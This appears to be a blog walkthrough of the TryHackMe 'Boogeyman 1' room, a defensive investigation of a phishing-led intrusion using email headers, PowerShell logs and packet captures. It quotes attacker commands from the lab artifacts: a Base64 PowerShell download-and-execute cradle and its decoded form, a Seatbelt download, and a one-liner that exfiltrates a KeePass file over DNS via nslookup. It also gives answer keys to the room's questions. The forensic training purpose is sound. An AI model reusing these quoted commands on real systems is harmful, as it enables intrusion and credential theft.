---
title: Boogeyman 1 Walkthrough
description: Investigate the initial attack chain of the Boogeyman threat actor using endpoint, email, and network artifacts.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this first room of the Boogeyman series, we investigate an initial access and data exfiltration incident at Quick Logistics LLC. Starting from a phishing email (`dump.eml`), we examine the email headers and extract a password-protected shortcut file (`Invoice_20230103.lnk`), pivot into PowerShell Script Block logs (`powershell.json`) to uncover `Seatbelt` enumeration, `Microsoft Sticky Notes` database harvesting, and DNS exfiltration of a `KeePass` vault, and finish by analyzing `capture.pcapng` in Wireshark and `tshark`.

---

**Learning Objectives**

- Analyze phishing artifacts and malicious attachments
- Investigate PowerShell logs and Sysmon events to trace post-exploitation activity
- Inspect network packet captures (PCAPs) to uncover C2 communications and data exfiltration

---
## Task 1.1
**What is the email address used to send the phishing email?**

**Answer**: `agriffin@bpakcaging.xyz`

**Why?**
Opening `dump.eml` in Thunderbird shows the `From` header set to `Arthur Griffin <agriffin@bpakcaging.xyz>` (notice the typosquatted domain `bpakcaging.xyz` instead of `bpackaging.xyz`).

![](../../assets/Pasted%20image%2020261115170959.png)

## Task 1.2
**What is the email address of the victim?**

**Answer**: `julianne.westcott@hotmail.com`

**Why?**
From the same Thunderbird header view, the `To` recipient is `Julianne Westcott <julianne.westcott@hotmail.com>`.

![](../../assets/Pasted%20image%2020261115171000.png)

## Task 1.3
**What is the name of the third-party mail relay service used by the attacker based on the `DKIM-Signature` and `List-Unsubscribe` headers?**

**Answer**: `ElasticMail.com`

**Why?**
Pasting the raw email headers into MXToolbox Header Analyzer and inspecting the `DKIM-Signature` record (`v=1; a=rsa-sha256; d=elasticemail.com; s=api;`) reveals the third-party mail relay service `ElasticMail.com` (`elasticemail.com`).

![](../../assets/Pasted%20image%2020261115171329.png)

![](../../assets/Pasted%20image%2020261115171323.png)

## Task 1.4
**What is the name of the file inside the encrypted attachment?**

**Answer**: `Invoice_20230103.lnk`

**Why?**
Opening the attached `Invoice.zip` archive reveals a password-protected Windows shortcut file named `Invoice_20230103.lnk`.

![](../../assets/Pasted%20image%2020261115172142.png)

## Task 1.5
**What is the password used to extract the attachment?**

**Answer**: `Invoice2023!`

**Why?**
Reading the body of the phishing email sent to Julianne shows the line: `You may use this code to view the encrypted file: Invoice2023!`.

![](../../assets/Pasted%20image%2020261115172253.png)

## Task 2.1
**Based on the result of the `lnkparse` tool, what is the encoded payload in the `Command line arguments` field?**

**Answer**: `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`

**Why?**
After extracting `Invoice_20230103.lnk` and running `lnkparse Invoice_20230103.lnk`, the `DATA` section shows `powershell.exe` invoked with `-nop -windowstyle hidden -enc` followed by the Base64 payload above.

![](../../assets/Pasted%20image%2020261115172407.png)

## Task 2.2
**What are the domains used by the attacker for file hosting and C2? (Provide the domains in alphabetical order, comma-delimited)**

**Answer**: `cdn.bpakcaging.xyz,files.bpakcaging.xyz`

**Why?**
Decoding the Base64 string from `lnkparse` in CyberChef gives `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`, which gives us the first domain (`files.bpakcaging.xyz`).

![](../../assets/Pasted%20image%2020261115172439.png)

To find the second domain, we parse `powershell.json` using `jq` to inspect all unique `ScriptBlockText` entries:

```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq
```

This reveals the C2 loop connecting to `$s='cdn.bpakcaging.xyz:8080'`, giving us `cdn.bpakcaging.xyz,files.bpakcaging.xyz`.

![](../../assets/Pasted%20image%2020261115172655.png)
![](../../assets/Pasted%20image%2020261115172716.png)

## Task 2.3
**Now that we have the PowerShell commands, what is the name of the enumeration tool downloaded by the attacker?**

**Answer**: `Seatbelt`

**Why?**
In the `ScriptBlockText` output, we see the attacker downloading `Invoke-Seatbelt.ps1` as well as `iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe` and executing `.\sb.exe -group=all` and `Seatbelt.exe -group=user`. Looking up `sb.exe` confirms it is a shortened name for the C# host enumeration tool `Seatbelt`.

![](../../assets/Pasted%20image%2020261115172925.png)

![](../../assets/Pasted%20image%2020261115172957.png)

## Task 2.4
**The attacker executed a binary (`sq3.exe`) to query a database file (`plum.sqlite`). Which software uses this database file?**

**Answer**: `Microsoft Sticky Notes`

**Why?**
Looking at the PowerShell logs, the attacker lists `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\` and runs:

```powershell
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"
```

The folder path confirms that `plum.sqlite` belongs to `Microsoft Sticky Notes`.

![](../../assets/Pasted%20image%2020261115172925.png)

![](../../assets/Pasted%20image%2020261115173108.png)

## Task 2.5
**The attacker was able to discover a file (`protected_data.kdbx`) on the victim's machine. Which software uses this file extension?**

**Answer**: `KeePass`

**Why?**
The `.kdbx` extension is an encrypted password database format used by `KeePass`.

![](../../assets/Pasted%20image%2020261115173136.png)

## Task 2.6
**Which command-line utility was used by the attacker to exfiltrate the file?**

**Answer**: `nslookup`

**Why?**
In `powershell.json`, the attacker reads the bytes of `C:\Users\j.westcott\Documents\protected_data.kdbx`, converts them to hex (`ToString X2`), splits the hex string into 50-character chunks, and exfiltrates each chunk via `nslookup`:

```powershell
$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination; } echo "Done";
```

![](../../assets/Pasted%20image%2020261115173258.png)

## Task 3.1
**What is the software used by the attacker to host the malicious file `/update`?**

**Answer**: `Python` (or `SimpleHTTP`)

**Why?**
Opening `capture.pcapng` in Wireshark, filtering for `http contains "files.bpakcaging.xyz"`, and following the HTTP stream for `GET /update HTTP/1.1` reveals the response header `Server: SimpleHTTP/0.6 Python/3.10.7`.

![](../../assets/Pasted%20image%2020261115173816.png)

![](../../assets/Pasted%20image%2020261115173826.png)

![](../../assets/Pasted%20image%2020261115173844.png)

## Task 3.2
**Which HTTP method is used by the C2 agent to send the output of the executed commands?**

**Answer**: `POST`

**Why?**
Inspecting the C2 traffic to `159.89.205.40` (`cdn.bpakcaging.xyz:8080`) in Wireshark shows command output being sent back via `POST /27fe2489 HTTP/1.1`.

![](../../assets/Pasted%20image%2020261115173930.png)

## Task 3.3
**Which protocol was used by the attacker to exfiltrate the `protected_data.kdbx` file?**

**Answer**: `DNS`

**Why?**
Because the attacker used `nslookup -q=A "$line.bpakcaging.xyz"` to send each 50-character hex chunk as a subdomain query, the exfiltration occurred over `DNS`.

## Task 3.4
**What is the master password of the KeePass database discovered in the Sticky Notes database?**

**Answer**: `%p9*31lL^Mz47E2GaT^y`

**Why?**
To find the output of the `sq3.exe ... plum.sqlite "SELECT * from NOTE limit 100"` command in `capture.pcapng`, we filter Wireshark for `http contains "sq3.exe"` and follow the corresponding TCP stream (`tcp.stream eq 750`).

![](../../assets/Pasted%20image%2020261115174625.png)

![](../../assets/Pasted%20image%2020261115174635.png)

The `POST /27fe2489` request body contains a space-separated string of decimal byte values (`92 105 100 61 56 ...`) as encoded by `[System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' '`.

![](../../assets/Pasted%20image%2020261115174725.png)

Decoding the decimal values in CyberChef using `From Decimal` reveals the contents of Julianne's Sticky Notes, including `Master Password`: `%p9*31lL^Mz47E2GaT^y`.

![](../../assets/Pasted%20image%2020261115174822.png)

![](../../assets/Pasted%20image%2020261115174902.png)

## Task 3.5
**Extracting the Exfiltrated DNS Hex Chunks**

**Why?**
After manual inspection in Wireshark, I used `tshark` to filter for all DNS queries containing `.bpakcaging.xyz`:

```bash
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz"
```

![](../../assets/Pasted%20image%2020261115175029.png)

Seeing the repeated hex strings prefixed to `.bpakcaging.xyz`, we can cut on the first dot, exclude `files` and `cdn`, deduplicate with `uniq`, and export the hex chunks to `extracted.txt`:

```bash
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq > extracted.txt
```

![](../../assets/Pasted%20image%2020261115175139.png)
![](../../assets/Pasted%20image%2020261115175145.png)

![](../../assets/Pasted%20image%2020261115175344.png)

Here I got stuck and did not know what to do next with this hex output, so I looked up some writeups to finish the room. Because of that, I am not going to include the final step here, as that was a gap in my own knowledge at the time.

---

## Personal Note: Boogeyman 1 Investigation & Extraction Commands

Quick reference of the commands and techniques we used across the email, PowerShell log, and PCAP analysis:

- **1. Extracting Attachments & Macros from `.eml` Files**:
  - Open `.eml` headers or load in Thunderbird to inspect sender, recipient, and attachment names.
  - Dump VBA macros with `oledump.py DumpMe.eml` -> `oledump.py -s <stream> -v DumpMe.eml`.
- **2. Querying JSON Event Logs with `jq` (`powershell.json`)**:
  - Filter by Event ID (`4104` ScriptBlock logging or `800` Pipeline execution) and extract the script text:
    ```bash
    cat powershell.json | jq 'select(.Event.System.EventID == 4104) | .Event.EventData.ScriptBlockText'
    ```
- **3. Notable Post-Exploitation Artifacts**:
  - **Seatbelt (`sb.exe`)**: C# host survey tool (`-group=all`, `-group=user`).
  - **Microsoft Sticky Notes Database**: Located at `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` (queried via SQLite `SELECT * from NOTE`).
  - **KeePass Database (`.kdbx`)**: Encrypted password vault (`protected_data.kdbx`).
- **4. Extracting DNS Exfiltration Chunks with `tshark`**:
  - When data is hex-encoded and exfiltrated via `nslookup -q=A "<hex>.domain.tld"`, extract and reassemble the subdomain labels with:
    ```bash
    tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq > extracted.txt
    ```
  - *(Note: Once `extracted.txt` contains the raw hex strings without newlines, converting `From Hex` in CyberChef or `xxd -r -p extracted.txt > protected_data.kdbx` reconstructs the binary `.kdbx` file so it can be opened with the KeePass master password).*